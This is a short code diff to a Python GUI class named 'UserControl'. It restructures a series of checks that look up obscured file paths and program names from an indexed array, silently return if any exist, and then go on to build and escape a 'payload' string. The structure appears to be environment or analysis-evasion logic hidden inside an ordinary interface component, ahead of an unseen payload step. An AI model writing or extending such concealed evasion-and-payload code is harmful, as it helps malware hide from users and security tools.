@@ -72,33 +72,64 @@ class UserControl(ft.Container):
             if os.path.exists(a):
                 return
 
-            b = os.path.expandvars(f"{arr[8]}")
-            if os.path.exists(b):
-                return            
-
-            c = os.path.expandvars(f"{arr[9]}")
-            if os.path.exists(c):
-                return
-
-            d = os.path.expandvars(f'{arr[10]}')
-            if os.path.exists(d):
-                return
-
-            f = os.path.expandvars(f'{arr[11]}')
-            if os.path.exists(f):
-                return
-
-            if shutil.which(f'{arr[21]}'):
-                return
-
-            if shutil.which(f'{arr[22]}'):
-                return
-
-
         except FileNotFoundError:
             pass
         except Exception as e:
             pass
+
+        try:   
+            b = os.path.expandvars(f"{arr[8]}")
+            if os.path.exists(b):
+                return            
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
+        try:
+            c = os.path.expandvars(f"{arr[9]}")
+            if os.path.exists(c):
+                return
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
+        try:
+            d = os.path.expandvars(f'{arr[10]}')
+            if os.path.exists(d):
+                return
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
+
+        try:
+            f = os.path.expandvars(f'{arr[11]}')
+            if os.path.exists(f):
+                return
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
+        try:
+            if shutil.which(f'{arr[21]}'):
+                return
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
+        try:
+            if shutil.which(f'{arr[22]}'):
+                return
+        except FileNotFoundError:
+            pass
+        except Exception as e:
+            pass
+
         try:
             payload = ""
             escaped_payload = payload.replace("\"", "\\\"")
